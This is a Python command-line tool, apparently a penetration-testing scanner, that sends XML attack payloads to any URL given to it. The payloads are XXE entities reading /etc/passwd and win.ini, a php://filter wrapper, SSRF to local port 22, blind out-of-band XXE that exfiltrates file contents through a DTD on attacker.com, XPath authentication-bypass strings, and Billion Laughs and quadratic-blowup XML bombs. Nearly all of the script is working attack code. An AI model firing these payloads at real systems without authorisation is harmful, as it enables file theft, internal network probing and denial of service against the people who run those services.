#!/usr/bin/env python3
"""
Advanced XML Attacks Scanner
Tests for XXE (XML External Entity), XPath injection, and XML bomb attacks
"""

import requests
import json
import time
from datetime import datetime
from urllib.parse import urlparse

class XMLAttacksScanner:
    """Scanner for XML-based attacks"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Content-Type': 'application/xml'
        })

    def scan(self):
        """Run XML attacks testing"""
        print(f"[*] Starting XML attacks testing on {self.target_url}")

        # Test XXE (advanced)
        self._test_xxe_advanced()

        # Test XPath injection
        self._test_xpath_injection()

        # Test XML bomb
        self._test_xml_bomb()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_xxe_advanced(self):
        """Test for advanced XXE vulnerabilities including blind XXE"""
        print("[*] Testing for advanced XXE...")

        # Classic XXE payloads
        xxe_payloads = [
            # Basic file read
            ('''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''', 'root:x:', 'File read via XXE'),

            # PHP wrapper (if PHP backend)
            ('''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>''', 'cm9vdDo', 'Base64 encoded file read'),

            # Internal network scan
            ('''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
]>
<foo>&xxe;</foo>''', 'SSH', 'SSRF via XXE'),

            # Blind XXE with parameter entities
            ('''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
%send;
]>
<foo>test</foo>''', None, 'Blind XXE (OOB)'),

            # XXE with data exfiltration
            ('''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&send;</data>''', None, 'Blind XXE with exfiltration'),

            # Windows file read
            ('''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>''', '[fonts]', 'Windows file read'),
        ]

        for payload, expected, description in xxe_payloads:
            try:
                start_time = time.time()
                response = self.session.post(self.target_url, data=payload, timeout=15)
                elapsed = time.time() - start_time

                # Check for successful XXE
                if expected and expected in response.text:
                    vuln = {
                        'type': 'XML External Entity (XXE) Injection',
                        'severity': 'critical',
                        'url': self.target_url,
                        'payload': payload[:200],
                        'evidence': f'{description} - Found: {expected}',
                        'description': f'XXE vulnerability detected: {description}',
                        'cwe': 'CWE-611',
                        'impact': 'File disclosure, SSRF, DoS, RCE',
                        'remediation': 'Disable external entities, use safe XML parsers'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: XXE found - {description}")
                    return

                # Check for blind XXE indicators (timeout, network activity)
                if elapsed > 10 and description.startswith('Blind'):
                    vuln = {
                        'type': 'Blind XXE Injection',
                        'severity': 'high',
                        'url': self.target_url,
                        'payload': payload[:200],
                        'evidence': f'Delayed response suggests {description}',
                        'description': 'Potential blind XXE vulnerability',
                        'cwe': 'CWE-611',
                        'impact': 'Data exfiltration via OOB channels',
                        'remediation': 'Disable external entities and DTD processing'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Potential blind XXE detected")

            except requests.exceptions.Timeout:
                # Timeout might indicate XXE is trying to connect
                if description.startswith('Blind'):
                    vuln = {
                        'type': 'Possible Blind XXE',
                        'severity': 'medium',
                        'url': self.target_url,
                        'evidence': f'Request timeout with {description}',
                        'description': 'Timeout suggests possible XXE vulnerability',
                        'cwe': 'CWE-611',
                        'impact': 'Potential data exfiltration',
                        'remediation': 'Disable external entities'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Possible blind XXE (timeout)")
            except:
                pass

    def _test_xpath_injection(self):
        """Test for XPath injection"""
        print("[*] Testing for XPath injection...")

        # XPath injection payloads
        xpath_payloads = [
            # Authentication bypass
            ('''<?xml version="1.0"?>
<user>
    <username>' or '1'='1</username>
    <password>' or '1'='1</password>
</user>''', 'Authentication bypass'),

            # Boolean-based injection
            ('''<?xml version="1.0"?>
<search>
    <query>' or 1=1 or 'a'='a</query>
</search>''', 'Boolean OR injection'),

            # Extract node names
            ('''<?xml version="1.0"?>
<search>
    <query>' or name()='password</query>
</search>''', 'Node name extraction'),

            # Extract string values
            ('''<?xml version="1.0"?>
<search>
    <query>' or string-length(//password)>0 or '1'='2</query>
</search>''', 'String extraction'),

            # Count nodes
            ('''<?xml version="1.0"?>
<search>
    <query>' or count(//user)>0 or '1'='2</query>
</search>''', 'Node counting'),
        ]

        for payload, description in xpath_payloads:
            try:
                response = self.session.post(self.target_url, data=payload, timeout=10)

                # Check for injection indicators
                injection_indicators = [
                    'welcome',
                    'success',
                    'logged in',
                    'user',
                    'password',
                    'admin',
                ]

                for indicator in injection_indicators:
                    if indicator in response.text.lower() and response.status_code == 200:
                        vuln = {
                            'type': 'XPath Injection',
                            'severity': 'high',
                            'url': self.target_url,
                            'payload': payload[:200],
                            'evidence': f'{description} - Response indicates successful injection',
                            'description': f'XPath injection detected: {description}',
                            'cwe': 'CWE-643',
                            'impact': 'Authentication bypass, data extraction from XML',
                            'remediation': 'Use parameterized XPath queries, input validation'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] XPath injection found - {description}")
                        return

            except:
                pass

    def _test_xml_bomb(self):
        """Test for XML bomb (Billion Laughs) vulnerability"""
        print("[*] Testing for XML bomb (DoS)...")

        # Billion Laughs Attack (scaled down for testing)
        xml_bomb = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'''

        # Quadratic Blowup Attack
        quadratic_bomb = '''<?xml version="1.0"?>
<!DOCTYPE bomb [
<!ENTITY a "aaaaaaaaaa... (1000 a's)">
]>
<bomb>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomb>'''

        # External entity expansion bomb
        external_bomb = '''<?xml version="1.0"?>
<!DOCTYPE bomb [
<!ENTITY % file SYSTEM "file:///dev/random">
<!ENTITY % dtd SYSTEM "http://attacker.com/dos.dtd">
%dtd;
]>
<bomb>&send;</bomb>'''

        bombs = [
            (xml_bomb, 'Billion Laughs Attack'),
            (quadratic_bomb, 'Quadratic Blowup Attack'),
        ]

        for payload, description in bombs:
            try:
                # Set shorter timeout for DoS testing
                start_time = time.time()
                response = self.session.post(self.target_url, data=payload, timeout=5)
                elapsed = time.time() - start_time

                # If response is extremely slow or times out, likely vulnerable
                if elapsed > 4:
                    vuln = {
                        'type': 'XML Bomb (DoS)',
                        'severity': 'high',
                        'url': self.target_url,
                        'attack_type': description,
                        'evidence': f'Slow response ({elapsed:.2f}s) indicates vulnerability to {description}',
                        'description': f'Application vulnerable to {description}',
                        'cwe': 'CWE-776',
                        'impact': 'Denial of Service, resource exhaustion',
                        'remediation': 'Limit entity expansion, disable DTDs, use secure XML parsers'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] XML bomb vulnerability detected - {description}")
                    return

            except requests.exceptions.Timeout:
                # Timeout indicates successful DoS
                vuln = {
                    'type': 'XML Bomb (DoS)',
                    'severity': 'high',
                    'url': self.target_url,
                    'attack_type': description,
                    'evidence': f'Request timeout with {description}',
                    'description': f'Application vulnerable to {description}',
                    'cwe': 'CWE-776',
                    'impact': 'Denial of Service, server resource exhaustion',
                    'remediation': 'Disable entity expansion, use safe XML parsers'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] XML bomb vulnerability detected (timeout) - {description}")
                return
            except:
                pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 xml_attacks.py <url> [output_file]")
        print("\nExample:")
        print("  python3 xml_attacks.py https://example.com/api/xml")
        print("\nTests for:")
        print("  - XXE (XML External Entity) - file read, SSRF, blind XXE")
        print("  - XPath injection - authentication bypass, data extraction")
        print("  - XML bomb (Billion Laughs, Quadratic Blowup)")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    scanner = XMLAttacksScanner(target, output)
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
        print(f"    Medium: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'medium')}")
